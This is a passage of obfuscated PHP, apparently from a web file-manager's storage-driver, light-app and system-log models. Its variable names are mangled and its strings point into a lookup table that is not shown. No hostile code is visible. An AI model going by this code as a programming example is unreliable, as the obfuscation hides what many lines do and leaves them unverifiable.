{ $ƒ¡éæóò[$İ¾¶±†™] = $Åí„…„ì; $¨ö–ûÚ[$Õ’ÂŠ›¨[6]] = json_encode($ƒ¡éæóò); } else { if ($ÈÄºœ¨‚ != $Åí„…„ì) { $¨ö–ûÚ[$Õ’ÂŠ›¨[2358]] = $Õ’ÂŠ›¨[91]; } } } public function checkConfig(&$„ÖÚ£å„, $ìïß€íÓ = false) { $Ñ·Çª™¤ =& $_SERVER[Î·Ü›öğ]; $˜ƒÃÄ‘ = strtolower($„ÖÚ£å„[$Ñ·Çª™¤[98]]); $±î×»Òˆ = $„ÖÚ£å„[$Ñ·Çª™¤[6]]; if (!is_array($±î×»Òˆ)) { $±î×»Òˆ = json_decode($±î×»Òˆ, !0); } foreach ($±î×»Òˆ as $¡•§¦¸ˆ => $ÁÍ¥†š€) { if (is_string($ÁÍ¥†š€)) { $±î×»Òˆ[$¡•§¦¸ˆ] = trim($ÁÍ¥†š€); } } $±î×»Òˆ[$Ñ·Çª™¤[2361]] = rand_string(6); $å¯«¦™ï = $GLOBALS[$Ñ·Çª™¤[6]][$Ñ·Çª™¤[92]][$Ñ·Çª™¤[923]]; $Äêô—È¤ = isset($å¯«¦™ï[$˜ƒÃÄ‘]) ? $å¯«¦™ï[$˜ƒÃÄ‘] : ucfirst($˜ƒÃÄ‘); $¶º§£…õ = $Ñ·Çª™¤[77] . $Äêô—È¤; if (!$Äêô—È¤ || !class_exists($¶º§£…õ)) { if ($ìïß€íÓ) { return LNG($Ñ·Çª™¤[2362]); } write_log(array($Ñ·Çª™¤[2363], $„ÖÚ£å„, get_caller_info()), $Ñ·Çª™¤[216]); show_json(LNG($Ñ·Çª™¤[2362]), !1, $„ÖÚ£å„); } $Ä¬Ü½Ù¶ = new $¶º§£…õ($±î×»Òˆ); $ıï¯šñ = rtrim($±î×»Òˆ[$Ñ·Çª™¤[1292]], $Ñ·Çª™¤[8]) . $Ñ·Çª™¤[8]; if (in_array($˜ƒÃÄ‘, $Ä¬Ü½Ù¶->objectDriver)) { try { if (!$Ä¬Ü½Ù¶->isBucketCors() && !$Ä¬Ü½Ù¶->setBucketCors()) { $Ìˆ·õéÉ = LNG($Ñ·Çª™¤[2364]); $Ìˆ·õéÉ .= $Ñ·Çª™¤[2365] . LNG($Ñ·Çª™¤[2366]); } } catch (Exception $éáğáèœ) { $Ìˆ·õéÉ = $éáğáèœ->getMessage(); } if (isset($Ìˆ·õéÉ)) { return $this->_parseError($Ìˆ·õéÉ, $˜ƒÃÄ‘, $ìïß€íÓ); } if ($˜ƒÃÄ‘ == $Ñ·Çª™¤[68] && !$Ä¬Ü½Ù¶->checkRegion()) { return $this->_parseError(LNG($Ñ·Çª™¤[2367]), $˜ƒÃÄ‘, $ìïß€íÓ); } } else { if ($˜ƒÃÄ‘ == $Ñ·Çª™¤[2368]) { if ($Ä¬Ü½Ù¶->ftpPath) { $Äò‰êšĞ = trim($ıï¯šñ, $Ñ·Çª™¤[8]); if (stripos($Äò‰êšĞ, trim($Ä¬Ü½Ù¶->ftpPath, $Ñ·Çª™¤[8])) !== 0) { $ıï¯šñ = $Ä¬Ü½Ù¶->ftpPath . $Ñ·Çª™¤[8] . ($Äò‰êšĞ ? $Äò‰êšĞ . $Ñ·Çª™¤[8] : $Ñ·Çª™¤[12]); } } } } $ŠûÕ¿Şù = $Ä¬Ü½Ù¶->getPath($ıï¯šñ . $Ñ·Çª™¤[1296]); try { if ($˜ƒÃÄ‘ == $Ñ·Çª™¤[109]) { $Ä¬Ü½Ù¶->mkdir($ıï¯šñ); } $“Ó¥à…¢ = $Ä¬Ü½Ù¶->mkfile($ŠûÕ¿Şù); if (!$“Ó¥à…¢) { $Ìˆ·õéÉ = LNG($Ñ·Çª™¤[2364]); } } catch (Exception $éáğáèœ) { $Ìˆ·õéÉ = $éáğáèœ->getMessage(); } if (isset($Ìˆ·õéÉ)) { return $this->_parseError($Ìˆ·õéÉ, $˜ƒÃÄ‘, $ìïß€íÓ); } $±î×»Òˆ[$Ñ·Çª™¤[1292]] = $ıï¯šñ; $„ÖÚ£å„[$Ñ·Çª™¤[6]] = json_encode($±î×»Òˆ); $„ÖÚ£å„[$Ñ·Çª™¤[98]] = $Äêô—È¤; return !0; } private function _parseError($Íí•éµî, $¦Ù¬‡Í, $™êòÅÒ² = false) { $‹É¡ƒğ› =& $_SERVER[Î·Ü›öğ]; if ($¦Ù¬‡Í == $‹É¡ƒğ›[68] && stripos($Íí•éµî, $‹É¡ƒğ›[2369])) { $½š÷Ë¢× = explode($‹É¡ƒğ›[10], $Íí•éµî); $Ä±áë£ = isset($½š÷Ë¢×[1]) ? $½š÷Ë¢×[1] : $‹É¡ƒğ›[12]; $˜©½ùİÓ = array($‹É¡ƒğ›[2370] => LNG($‹É¡ƒğ›[2371]), $‹É¡ƒğ›[2372] => LNG($‹É¡ƒğ›[2373])); if (isset($˜©½ùİÓ[$Ä±áë£])) { $Íí•éµî = $˜©½ùİÓ[$Ä±áë£]; } } if (stripos($Íí•éµî, $‹É¡ƒğ›[2374]) === 0) { $Å¯Æ«Èª = strpos($Íí•éµî, $‹É¡ƒğ›[178]); if ($Å¯Æ«Èª === !1) { $Å¯Æ«Èª = strpos($Íí•éµî, $‹É¡ƒğ›[4]); } if ($Å¯Æ«Èª !== !1) { $Íí•éµî = substr($Íí•éµî, $Å¯Æ«Èª + 1); } } $Íí•éµî = LNG($‹É¡ƒğ›[1299]) . $Íí•éµî; if ($™êòÅÒ²) { return $Íí•éµî; } show_json($Íí•éµî, !1); } public function driverListSystem() { $™ÊÄÒÏ =& $_SERVER[Î·Ü›öğ]; $Á–ÔËõ— = parent::listData(); $Õ¼„“­ = array(); foreach ($Á–ÔËõ— as $öïÒ‡ÑÖ) { unset($öïÒ‡ÑÖ[$™ÊÄÒÏ[234]], $öïÒ‡ÑÖ[$™ÊÄÒÏ[88]]); if (!is_array($öïÒ‡ÑÖ[$™ÊÄÒÏ[6]])) { $öïÒ‡ÑÖ[$™ÊÄÒÏ[6]] = json_decode($öïÒ‡ÑÖ[$™ÊÄÒÏ[6]], !0); } $Õ¼„“­[] = $öïÒ‡ÑÖ; } return $Õ¼„“­; } public function defaultDriver() { $£ªÑ¢êÄ =& $_SERVER[Î·Ü›öğ]; $ÅğÛûø = parent::listData(); $Ä”´—ëĞ = array_filter_by_field($ÅğÛûø, $£ªÑ¢êÄ[37], 1); $Ä”´—ëĞ = $Ä”´—ëĞ[0]; if (!$Ä”´—ëĞ) { return array(); } if (!is_array($Ä”´—ëĞ[$£ªÑ¢êÄ[6]])) { $Ä”´—ëĞ[$£ªÑ¢êÄ[6]] = json_decode($Ä”´—ëĞ[$£ªÑ¢êÄ[6]], !0); } return $Ä”´—ëĞ; } public function driverInfo($æô¼ı±…) { $´ù­œ›Ş =& $_SERVER[Î·Ü›öğ]; $óÀİùÑ  = array_to_keyvalue(parent::listData(), $´ù­œ›Ş[477]); if (!isset($óÀİùÑ [$æô¼ı±…])) { return !1; } $¯åÑîÛü = $óÀİùÑ [$æô¼ı±…]; if (!is_array($¯åÑîÛü[$´ù­œ›Ş[6]])) { $¯åÑîÛü[$´ù­œ›Ş[6]] = json_decode($¯åÑîÛü[$´ù­œ›Ş[6]], !0); } return $¯åÑîÛü; } public function remove($„ÔñÊ) { $this->removeShareItems($„ÔñÊ); return parent::remove($„ÔñÊ); } public function removeWithFile($ğØ‹Ã‡×, $¿âïç õ, $õÓá»—µ, $Ÿ¥»áÍ‡ = false) { $û‘·§ë” =& $_SERVER[Î·Ü›öğ]; $ŸØÈµõ¡ = array($û‘·§ë”[915] => $ğØ‹Ã‡×); $ñ€·ì¶Õ = Model($û‘·§ë”[557])->where($ŸØÈµõ¡)->count(); $Ì‰¼™§’ = Model($û‘·§ë”[557])->where($ŸØÈµõ¡)->sum($û‘·§ë”[79]); $–€í»„€ = $¿âïç õ . $û‘·§ë”[2375] . $ğØ‹Ã‡×; $ğ£»º™ì = LNG($¿âïç õ == $û‘·§ë”[636] ? $û‘·§ë”[2376] : $û‘·§ë”[2377]); $İ’ö¸¦ = new TaskFileTransfer($–€í»„€, $û‘·§ë”[216], $ñ€·ì¶Õ, $ğ£»º™ì . $û‘·§ë”[464] . $õÓá»—µ[$û‘·§ë”[32]] . $û‘·§ë”[215] . $ğØ‹Ã‡×); $İ’ö¸¦->task[$û‘·§ë”[853]] = (double) $Ì‰¼™§’; $Ûæ“Ñ¤‰ = KodIO::defaultDriver(); $¿¨ƒïÛ = $Ûæ“Ñ¤‰[$û‘·§ë”[477]]; $à‚â×áÃ = $æ’—¸¸ó = $ÓıÕ…Ì = array(); $†€¬ë¬Ã = Model($û‘·§ë”[233])->where($ŸØÈµõ¡)->field($û‘·§ë”[2378])->select(); foreach ($†€¬ë¬Ã as $øõ”†²) { $¥Ù¨¦ú™ = $øõ”†²[$û‘·§ë”[554]]; if ($Ÿ¥»áÍ‡) { $æ’—¸¸ó[] = $¥Ù¨¦ú™; continue; } $ÀÀ—í‰ = $øõ”†²[$û‘·§ë”[87]]; $˜Ú‘¯ĞÜ = get_path_father($ÀÀ—í‰); $ÓıÕ…Ì[] = $˜Ú‘¯ĞÜ; $˜Ú‘¯ĞÜ = str_replace("\x7b\x69\157\72{$ğØ‹Ã‡×}\175\x2f", "\173\x69\157\72{$¿¨ƒïÛ}\175\x2f", $˜Ú‘¯ĞÜ); if (!IO::exist($ÀÀ—í‰)) { $à‚â×áÃ[] = $¥Ù¨¦ú™; $İ’ö¸¦->updateFileEnd($øõ”†²[$û‘·§ë”[32]], $øõ”†²[$û‘·§ë”[79]]); write_log($û‘·§ë”[2379] . $ÀÀ—í‰, $û‘·§ë”[1943]); continue; } $ĞšãÊäâ = IO::move($ÀÀ—í‰, $˜Ú‘¯ĞÜ, REPEAT_RENAME); if (!$ĞšãÊäâ) { $æ’—¸¸ó[] = $¥Ù¨¦ú™; $İ’ö¸¦->updateFileEnd($øõ”†²[$û‘·§ë”[32]], $øõ”†²[$û‘·§ë”[79]]); write_log($û‘·§ë”[2380] . $ÀÀ—í‰, $û‘·§ë”[1943]); continue; } $ŸØÈµõ¡ = array($û‘·§ë”[554] => $¥Ù¨¦ú™); $Òã™ÂĞ = array($û‘·§ë”[915] => $¿¨ƒïÛ, $û‘·§ë”[87] => $ĞšãÊäâ); Model($û‘·§ë”[233])->where($ŸØÈµõ¡)->save($Òã™ÂĞ); } $¢ß÷Ş± = $İ’ö¸¦->task; if (!$Ÿ¥»áÍ‡) { Cache::set($–€í»„€, $¢ß÷Ş±); } $İ’ö¸¦->end(); $à‚â×áÃ = array_unique($à‚â×áÃ); $æ’—¸¸ó = array_unique($æ’—¸¸ó); if (!$Ÿ¥»áÍ‡ && ($à‚â×áÃ || $æ’—¸¸ó)) { $Ó‡‡÷Öú = array(); if ($à‚â×áÃ) { $Ó‡‡÷Öú[] = sprintf(LNG($û‘·§ë”[2381]), count($à‚â×áÃ)); } if ($æ’—¸¸ó) { $Ó‡‡÷Öú[] = sprintf(LNG($û‘·§ë”[2382]), count($æ’—¸¸ó)); } $Ó‡‡÷Öú = sprintf(LNG($û‘·§ë”[2383]), implode($û‘·§ë”[2384], $Ó‡‡÷Öú)) . $û‘·§ë”[2385] . date($û‘·§ë”[2386]) . $û‘·§ë”[2387]; if ($¿âïç õ == $û‘·§ë”[1257]) { $Ó‡‡÷Öú .= $û‘·§ë”[2388] . LNG($û‘·§ë”[2389]); } else { $Ó‡‡÷Öú = LNG($û‘·§ë”[2390]) . $û‘·§ë”[2391] . $Ó‡‡÷Öú; } $¢ß÷Ş±[$û‘·§ë”[1294]] = $Ó‡‡÷Öú; Cache::set($–€í»„€, $¢ß÷Ş±); unset($õÓá»—µ[$û‘·§ë”[6]]); $Ù»Î÷ê³ = array($û‘·§ë”[477] => $ğØ‹Ã‡×, $û‘·§ë”[2260] => $û‘·§ë”[636], $û‘·§ë”[32] => $õÓá»—µ[$û‘·§ë”[32]], $û‘·§ë”[98] => $õÓá»—µ[$û‘·§ë”[98]]); Hook::trigger($û‘·§ë”[1821], array($û‘·§ë”[1317] => $Ù»Î÷ê³, $û‘·§ë”[1327] => !0)); show_json($Ó‡‡÷Öú, !1, 100111); } if ($¿âïç õ == $û‘·§ë”[636]) { return !0; } if ($à‚â×áÃ || $æ’—¸¸ó) { $ÜÑÆÙì™ = array_merge($à‚â×áÃ, $æ’—¸¸ó); $ÜÑÆÙì™ = array_filter(array_unique($ÜÑÆÙì™)); $this->removeByFileID($ÜÑÆÙì™); } if ($ÓıÕ…Ì) { $ÓıÕ…Ì = array_filter(array_unique($ÓıÕ…Ì)); foreach ($ÓıÕ…Ì as $ÀÀ—í‰) { $ƒóÕ±£ª = IO::has($ÀÀ—í‰, !0); if (!$ƒóÕ±£ª[$û‘·§ë”[242]] && !$ƒóÕ±£ª[$û‘·§ë”[243]]) { IO::remove($ÀÀ—í‰); } } } return $this->remove($ğØ‹Ã‡×); } private function removeByFileID($×¹ğõ¥† = array()) { $şÚæßï¿ =& $_SERVER[Î·Ü›öğ]; if (empty($×¹ğõ¥†)) { return; } $”–•£ìŞ = array($şÚæßï¿[554] => array($şÚæßï¿[7], $×¹ğõ¥†)); $ğ…§úû§ = Model($şÚæßï¿[1458])->where($”–•£ìŞ)->field($şÚæßï¿[2336])->select(); if (!$ğ…§úû§) { return Model($şÚæßï¿[557])->remove($×¹ğõ¥†); } $ğ…§úû§ = array_to_keyvalue($ğ…§úû§, $şÚæßï¿[194], $şÚæßï¿[554]); foreach ($ğ…§úû§ as $‘øşÊş => $â¬¹ÚĞÇ) { Model($şÚæßï¿[922])->removeNow($‘øşÊş, !1); } $°½åÕ÷ú = array_diff($×¹ğõ¥†, array_unique(array_values($ğ…§úû§))); if ($°½åÕ÷ú) { return Model($şÚæßï¿[557])->remove($°½åÕ÷ú); } } private function removeShareItems($úÛÛ¨Ó») { $ ²î×„¤ =& $_SERVER[Î·Ü›öğ]; $œÅšœÆ = "\x7b\x69\157\x3a{$úÛÛ¨Ó»}\x7d\x2f"; $ñ„ù¤İ• = array($ ²î×„¤[194] => 0, $ ²î×„¤[1287] => array($ ²î×„¤[461], "{$œÅšœÆ}\45")); $Î†ï›† = Model($ ²î×„¤[1990])->where($ñ„ù¤İ•)->field($ ²î×„¤[681])->select(); if (empty($Î†ï›†)) { return; } $› ÕÌµ€ = array_to_keyvalue($Î†ï›†, $ ²î×„¤[12], $ ²î×„¤[681]); Model($ ²î×„¤[680])->remove($› ÕÌµ€); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\x2e\x4c\151\x67\150\x74\x41\x70\x70"; public $modelType = "\x53\x79\163\164\x65\155\117\x70\164\151\x6f\156"; public $field = array("\156\x61\155\x65", "\147\162\x6f\x75\x70", "\144\x65\x73\x63", "\143\x6f\x6e\x74\145\x6e\x74"); public function listData($Æ›Ë„ã = false, $õÈÖòÃÃ = "\155\x6f\x64\151\x66\171\x54\x69\x6d\145", $à‚óæ = true) { return parent::listData($Æ›Ë„ã, $õÈÖòÃÃ, $à‚óæ); } public function remove($“„ÆŸĞŞ) { $ÎğúÈç¶ = $this->findByName($“„ÆŸĞŞ); if (!$ÎğúÈç¶) { return !1; } return parent::remove($ÎğúÈç¶[$_SERVER[Î·Ü›öğ][477]]); } public function add($ìß¾àœ) { if ($this->findByName($ìß¾àœ[$_SERVER[Î·Ü›öğ][32]])) { return !1; } return parent::insert($ìß¾àœ); } public function update($Í•ÔÖÔ, $•ø†ßû) { $–ŸÈ³ö =& $_SERVER[Î·Ü›öğ]; $°ÎÚ¶ã = $this->findByName($Í•ÔÖÔ); $İí÷ıóº = $this->findByName($•ø†ßû[$–ŸÈ³ö[32]]); if (!$°ÎÚ¶ã || $İí÷ıóº && $İí÷ıóº[$–ŸÈ³ö[477]] != $°ÎÚ¶ã[$–ŸÈ³ö[477]]) { return !1; } return parent::update($°ÎÚ¶ã[$–ŸÈ³ö[477]], $•ø†ßû); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\155\137\154\157\147"; protected $dataAuto = array(array("\143\162\145\x61\164\x65\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\164", "\x66\165\156\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ëáÆìÕŠ =& $_SERVER[Î·Ü›öğ]; return array($ëáÆìÕŠ[2392] => LNG($ëáÆìÕŠ[2393]), $ëáÆìÕŠ[2394] => LNG($ëáÆìÕŠ[2395]), $ëáÆìÕŠ[1954] => LNG($ëáÆìÕŠ[2396]), $ëáÆìÕŠ[2397] => LNG($ëáÆìÕŠ[2398]), $ëáÆìÕŠ[2399] => LNG($ëáÆìÕŠ[2400]), $ëáÆìÕŠ[2401] => LNG($ëáÆìÕŠ[2402]), $ëáÆìÕŠ[2403] => LNG($ëáÆìÕŠ[2404]), $ëáÆìÕŠ[1983] => LNG($ëáÆìÕŠ[2404]), $ëáÆìÕŠ[1984] => LNG($ëáÆìÕŠ[2405]), $ëáÆìÕŠ[2406] => LNG($ëáÆìÕŠ[2407]), $ëáÆìÕŠ[2408] => LNG($ëáÆìÕŠ[2409]), $ëáÆìÕŠ[2410] => LNG($ëáÆìÕŠ[2411]), $ëáÆìÕŠ[2412] => LNG($ëáÆìÕŠ[2413]), $ëáÆìÕŠ[1981] => LNG($ëáÆìÕŠ[2414]), $ëáÆìÕŠ[2415] => LNG($ëáÆìÕŠ[2416]), $ëáÆìÕŠ[1988] => LNG($ëáÆìÕŠ[2417]), $ëáÆìÕŠ[2418] => LNG($ëáÆìÕŠ[2419]), $ëáÆìÕŠ[2420] => LNG($ëáÆìÕŠ[2421]), $ëáÆìÕŠ[2422] => LNG($ëáÆìÕŠ[2423]), $ëáÆìÕŠ[2424] => LNG($ëáÆìÕŠ[2425]), $ëáÆìÕŠ[1991] => LNG($ëáÆìÕŠ[2426]), $ëáÆìÕŠ[1992] => LNG($ëáÆìÕŠ[2427]), $ëáÆìÕŠ[2428] => LNG($ëáÆìÕŠ[2429]), $ëáÆìÕŠ[2430] => LNG($ëáÆìÕŠ[2431]), $ëáÆìÕŠ[2432] => LNG($ëáÆìÕŠ[2433]), $ëáÆìÕŠ[1986] => LNG($ëáÆìÕŠ[2434]), $ëáÆìÕŠ[2435] => LNG($ëáÆìÕŠ[2436]), $ëáÆìÕŠ[1985] => LNG($ëáÆìÕŠ[2437]), $ëáÆìÕŠ[2438] => LNG($ëáÆìÕŠ[2438]), $ëáÆìÕŠ[2439] => LNG($ëáÆìÕŠ[2440]), $ëáÆìÕŠ[2441] => LNG($ëáÆìÕŠ[2438]), $ëáÆìÕŠ[2442] => LNG($ëáÆìÕŠ[2443]), $ëáÆìÕŠ[2444] => LNG($ëáÆìÕŠ[2445]), $ëáÆìÕŠ[2446] => LNG($ëáÆìÕŠ[2445]), $ëáÆìÕŠ[2447] => LNG($ëáÆìÕŠ[2448]), $ëáÆìÕŠ[2449] => LNG($ëáÆìÕŠ[2449]), $ëáÆìÕŠ[2450] => LNG($ëáÆìÕŠ[1958]), $ëáÆìÕŠ[2451] => LNG($ëáÆìÕŠ[2452]), $ëáÆìÕŠ[2453] => LNG($ëáÆìÕŠ[2454]), $ëáÆìÕŠ[2455] => LNG($ëáÆìÕŠ[2456]), $ëáÆìÕŠ[2457] => LNG($ëáÆìÕŠ[2458]), $ëáÆìÕŠ[2459] => LNG($ëáÆìÕŠ[2460]), $ëáÆìÕŠ[2461] => LNG($ëáÆìÕŠ[2461]), $ëáÆìÕŠ[2462] => LNG($ëáÆìÕŠ[2463]), $ëáÆìÕŠ[2464] => LNG($ëáÆìÕŠ[2465]), $ëáÆìÕŠ[2466] => LNG($ëáÆìÕŠ[2467]), $ëáÆìÕŠ[2468] => LNG($ëáÆìÕŠ[2469]), $ëáÆìÕŠ[2470] => LNG($ëáÆìÕŠ[2471]), $ëáÆìÕŠ[2472] => LNG($ëáÆìÕŠ[2473]), $ëáÆìÕŠ[213] => LNG($ëáÆìÕŠ[213]), $ëáÆìÕŠ[214] => LNG($ëáÆìÕŠ[2474]), $ëáÆìÕŠ[2475] => LNG($ëáÆìÕŠ[2475])); } private function typeFile() { $Õ‡â’ =& $_SERVER[Î·Ü›öğ]; $¶ÜÈæ‹ = array($Õ‡â’[1988] => array($Õ‡â’[1989]), $Õ‡â’[2410] => array($Õ‡â’[2476]), $Õ‡â’[2412] => array($Õ‡â’[2477]), $Õ‡â’[1981] => array($Õ‡â’[1982], $Õ‡â’[2478]), $Õ‡â’[2420] => array(), $Õ‡â’[2422] => array(), $Õ‡â’[2424] => array(), $Õ‡â’[1991] => array($Õ‡â’[1993]), $Õ‡â’[1992] => array($Õ‡â’[1993]), $Õ‡â’[2428] => array($Õ‡â’[2479]), $Õ‡â’[2430] => array($Õ‡â’[2479]), $Õ‡â’[2432] => array($Õ‡â’[2480]), $Õ‡â’[2418] => array($Õ‡â’[2481]), $Õ‡â’[1986] => array($Õ‡â’[2482]), $Õ‡â’[2435] => array($Õ‡â’[2483]), $Õ‡â’[1985] => array($Õ‡â’[1987])); return $¶ÜÈæ‹; } private function typeAll() { $½Õ×îéî =& $_SERVER[Î·Ü›öğ]; $Ó‡˜İ™ = $this->typeList; $ã°ó÷“¾ = array_filter($this->typeFile()); foreach ($ã°ó÷“¾ as $¾Ìä¤ => $¤…‘üí) { $Ó‡˜İ™[$¤…‘üí[0]] = $Ó‡˜İ™[$¾Ìä¤]; } $Ó‡˜İ™[$½Õ×îéî[1993]] = LNG($½Õ×îéî[2484]); $Ó‡˜İ™[$½Õ×îéî[2479]] = LNG($½Õ×îéî[2485]); return $Ó‡˜İ™; } public function addLog($Óñ¤Ê“¶, $ßå†¤ú = array()) { $Í‡ŠÊí­ =& $_SERVER[Î·Ü›öğ]; if (!isset($this->typeList[$Óñ¤Ê“¶])) { return; } $È›åŸ­î = Session::get($Í‡ŠÊí­[2150]); if (!$È›åŸ­î) { $È›åŸ­î = _get($ßå†¤ú, $Í‡ŠÊí­[1810], 0); } if ($Óñ¤Ê“¶ == $Í‡ŠÊí­[2451] && is_array($ßå†¤ú[$Í‡ŠÊí­[2486]]) && !$ßå†¤ú[$Í‡ŠÊí­[2486]]) { return; } $˜’É½ÓÚ = get_client_ip(); if (!$ßå†¤ú || strlen(json_encode($ßå†¤ú)) >= 1024 * 64) { if ($ßå†¤ú && is_array($ßå†¤ú)) { $ßå†¤ú = array_intersect_key($ßå†¤ú, array_flip($Í‡ŠÊí­[477], $Í‡ŠÊí­[32])); $ßå†¤ú[$Í‡ŠÊí­[2487]] = $˜’É½ÓÚ; } else { $ßå†¤ú = array($Í‡ŠÊí­[2487] => $˜’É½ÓÚ); } } else { if (is_array($ßå†¤ú)) { $ßå†¤ú[$Í‡ŠÊí­[2487]] = $˜’É½ÓÚ; } else { $ßå†¤ú = array($Í‡ŠÊí­[1317] => $ßå†¤ú, $Í‡ŠÊí­[2487] => $˜’É½ÓÚ); } } $ßå†¤ú[$Í‡ŠÊí­[2488]] = ACTION; $ßå†¤ú = array($Í‡ŠÊí­[1800] => Session::sign(), $Í‡ŠÊí­[1801] => intval($È›åŸ­î), $Í‡ŠÊí­[33] => $Óñ¤Ê“¶, $Í‡ŠÊí­[1803] => json_encode($ßå†¤ú)); return parent::add($ßå†¤ú); } public function remove($»¸«ù¨‚) { $this->where(array($_SERVER[Î·Ü›öğ][504] => $»¸«ù¨‚))->delete(); } private function _makeOrder($Ú´ñáöµ = '') { $„—Ü­ô¸ =& $_SERVER[Î·Ü›öğ]; $Âœˆ¡¿Ö = $„—Ü­ô¸[234]; $ÖÖÜÒüÂ = array($„—Ü­ô¸[534] => $„—Ü­ô¸[535], $„—Ü­ô¸[536] => $„—Ü­ô¸[537]); $¿àôğòş = Input::get($„—Ü­ô¸[542], $„—Ü­ô¸[7], $„—Ü­ô¸[2193], array($„—Ü­ô¸[2105], $„—Ü­ô¸[536])); $¿àôğòş = $ÖÖÜÒüÂ[$¿àôğòş]; $Ú´ñáöµ = $Ú´ñáöµ . "{$Âœˆ¡¿Ö}\40{$¿àôğòş}"; return $this->order($Ú´ñáöµ); } public function get($˜¡«Õº² = '') { $é€©×ç =& $_SERVER[Î·Ü›öğ]; if (!$˜¡«Õº²) { show_json(array()); } $¬‘Õ¯¤‘ = array(); if ($˜¡«Õº²[$é€©×ç[1810]]) { $¬‘Õ¯¤‘[$é€©×ç[1810]] = $˜¡«Õº²[$é€©×ç[1810]]; } if (isset($˜¡«Õº²[$é€©×ç[850]])) { $íÓêçŠü = $˜¡«Õº²[$é€©×ç[850]]; $¾µı› = isset($˜¡«Õº²[$é€©×ç[851]]) ? $˜¡«Õº²[$é€©×ç[851]] : time(); $¬‘Õ¯¤‘[$é€©×ç[234]] = array($é€©×ç[410], array($íÓêçŠü, $¾µı›)); } if ($˜¡«Õº²[$é€©×ç[33]]) { $ê¼ÈÅÂ” = explode($é€©×ç[50], $˜¡«Õº²[$é€©×ç[33]]); $à¶¶‹öº = $this->typeFile(); $Áƒ¬¤­ğ = array(); foreach ($ê¼ÈÅÂ” as $„–Ëä Ğ) { $Áƒ¬¤­ğ[] = $„–Ëä Ğ; if (isset($à¶¶‹öº[$„–Ëä Ğ])) { $Áƒ¬¤­ğ = array_merge($Áƒ¬¤­ğ, $à¶¶‹öº[$„–Ëä Ğ]); } } $Áƒ¬¤­ğ = array_unique($Áƒ¬¤­ğ); if ($Áƒ¬¤­ğ) { $¬‘Õ¯¤‘[$é€©×ç[33]] = array($é€©×ç[7], $Áƒ¬¤­ğ); } } else { $¬‘Õ¯¤‘[$é€©×ç[33]] = array($é€©×ç[2489], $é€©×ç[2490]); } if (!empty($˜¡«Õº²[$é€©×ç[2487]])) { $¬‘Õ¯¤‘[$é€©×ç[537]] = array($é€©×ç[461], "\45{$˜¡«Õº²[$é€©×ç[2487]]}\x25"); } $½äÑœ²ê = $this->_makeOrder()->where($¬‘Õ¯¤‘)->selectPage(); if (empty($½äÑœ²ê[$é€©×ç[447]])) { show_json(array(), !0, $½äÑœ²ê[$é€©×ç[444]]); } $½äÑœ²ê[$é€©×ç[447]] = $this->logList($½äÑœ²ê[$é€©×ç[447]]); return $½äÑœ²ê; } private function ipAddress(&$ìüÙÅáé) { $â«ñ¹Î¡ =& $_SERVER[Î·Ü›öğ]; if (!empty($ìüÙÅáé[$â«ñ¹Î¡[2487]])) { $Èı„»Œ = IpLocation::get($ìüÙÅáé[$â«ñ¹Î¡[2487]]); } else { $Èı„»Œ = LNG($â«ñ¹Î¡[2491]); } $ìüÙÅáé[$â«ñ¹Î¡[2492]] = $Èı„»Œ; } private function descZipDownload($íäò¸, &$°—”£²¬) { $¿Ô¬¿á› =& $_SERVER[Î·Ü›öğ]; if (!isset($íäò¸[$¿Ô¬¿á›[2493]])) { return; } $È±áîİÃ = json_decode($íäò¸[$¿Ô¬¿á›[2493]], !0); foreach ($È±áîİÃ as $¿İóÚ™ö) { try { $›ùÕÓÔİ = IO::infoFullSimple($¿İóÚ™ö[$¿Ô¬¿á›[87]]); } catch (Exception $Å›Õğ‡ ) { continue; } $íäò¸[$¿Ô¬¿á›[87]] = $¿İóÚ™ö[$¿Ô¬¿á›[87]]; $°—”£²¬[] = $íäò¸[$¿Ô¬¿á›[194]] = $›ùÕÓÔİ[$¿Ô¬¿á›[194]]; $°—”£²¬[] = $íäò¸[$¿Ô¬¿á›[2255]] = $›ùÕÓÔİ[$¿Ô¬¿á›[193]]; break; } return $íäò¸; } private function getSourceList(&$Ü‹ÇÒ”) { $ÑËÇûƒù =& $_SERVER[Î·Ü›öğ]; $Èûöˆ = array(); foreach ($Ü‹ÇÒ” as $·± Åˆ => $’ÑÙò†ğ) { $œ†ï¥Éí = json_decode($’ÑÙò†ğ[$ÑËÇûƒù[537]], !0); if ($’ÑÙò†ğ[$ÑËÇûƒù[33]] == $ÑËÇûƒù[1984]) { $œ†ï¥Éí = $this->descZipDownload($œ†ï¥Éí, $Èûöˆ); $Ü‹ÇÒ”[$·± Åˆ][$ÑËÇûƒù[537]] = json_encode($œ†ï¥Éí); continue; } if (strpos($’ÑÙò†ğ[$ÑËÇûƒù[33]], $ÑËÇûƒù[2257]) !== 0) { if (!isset($œ†ï¥Éí[$ÑËÇûƒù[87]]) || strpos($’ÑÙò†ğ[$ÑËÇûƒù[33]], $ÑËÇûƒù[2494]) !== 0) { continue; } try { $€‚¼Áœ” = IO::infoFullSimple($œ†ï¥Éí[$ÑËÇûƒù[87]]); } catch (Exception $óŸ²ôªñ) { continue; } $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[194]] = $€‚¼Áœ”[$ÑËÇûƒù[194]]; $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[2255]] = $€‚¼Áœ”[$ÑËÇûƒù[193]]; $Ü‹ÇÒ”[$·± Åˆ][$ÑËÇûƒù[537]] = json_encode($œ†ï¥Éí); continue; } $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[194]]; $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[2255]]; if ($œ†ï¥Éí[$ÑËÇûƒù[33]] == $ÑËÇûƒù[636]) { $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[537]][$ÑËÇûƒù[1269]]; $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[537]][$ÑËÇûƒù[1270]]; } if ($œ†ï¥Éí[$ÑËÇûƒù[33]] == $ÑËÇûƒù[2266]) { $Èûöˆ[] = $œ†ï¥Éí[$ÑËÇûƒù[537]][$ÑËÇûƒù[194]]; } } if (!$Èûöˆ) { return array(); } return 